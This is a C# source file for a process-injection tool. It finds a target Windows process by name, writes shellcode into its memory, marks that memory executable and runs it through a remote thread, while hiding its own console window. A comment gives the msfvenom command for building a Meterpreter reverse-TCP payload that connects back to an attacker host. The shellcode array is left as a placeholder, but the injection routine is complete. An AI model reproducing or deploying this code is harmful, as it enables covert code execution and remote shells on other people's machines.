using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace InjectRemoteProcess
{
    public class Win32
    {

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, IntPtr nSize, int lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        public static int PROCESS_CREATE_THREAD = 0x0002;
        public static int PROCESS_QUERY_INFORMATION = 0x0400;
        public static int PROCESS_VM_OPERATION = 0x0008;
        public static int PROCESS_VM_WRITE = 0x0020;
        public static int PROCESS_VM_READ = 0x0010;

        public static UInt32 MEM_COMMIT = 0x1000;
        public static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        public static UInt32 PAGE_EXECUTE_READ = 0x20;
        public static UInt32 PAGE_READWRITE = 0x04;
        public static int SW_HIDE = 0;
    }

    public class InjectRemoteProcess
    {
        public static int GetPid(string procName)
        {
            int remoteProcId = 0;
            Process[] procs = Process.GetProcesses();
            foreach (Process proc in procs)
            {
                if(proc.ProcessName == procName)
                {
                    remoteProcId = proc.Id;
                    break;
                }
            }
            return remoteProcId;
        }

        public static void InjectShellcode(byte[] shellcode, int remoteProcId)
        {
            // Open remote process
            IntPtr hProcess = Win32.OpenProcess(Win32.PROCESS_CREATE_THREAD | Win32.PROCESS_QUERY_INFORMATION | Win32.PROCESS_VM_OPERATION | Win32.PROCESS_VM_WRITE | Win32.PROCESS_VM_READ, false, remoteProcId);

            // Allocate memory
            IntPtr spaceAddr = Win32.VirtualAllocEx(hProcess, IntPtr.Zero, shellcode.Length, Win32.MEM_COMMIT, Win32.PAGE_READWRITE);

            // Copy shellcode into allocated memory
            Win32.WriteProcessMemory(hProcess, spaceAddr, shellcode, new IntPtr(shellcode.Length), 0);

            // Change memory permission to PAGE_EXECUTE_READ
            uint oldProtect;
            Win32.VirtualProtectEx(hProcess, spaceAddr, (UIntPtr)shellcode.Length, Win32.PAGE_EXECUTE_READ, out oldProtect);

            // Create remote thread to execute shellcode
            Win32.CreateRemoteThread(hProcess, new IntPtr(0), new uint(), spaceAddr, new IntPtr(0), new uint(), new IntPtr(0));
        }

        static void Main(string[] args)
        {
            // Close the window
            var handle = Win32.GetConsoleWindow();
            Win32.ShowWindow(handle, Win32.SW_HIDE);

            string procName = args[0];
            int remoteProcId = GetPid(procName);

            // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread --smallest -f raw -o shellcode.bin
            byte[] shellcode = //new byte[<size>] { 0x75, 0x58, 0x6d, [...] };
                        
            InjectShellcode(shellcode, remoteProcId);
        }
    }
}
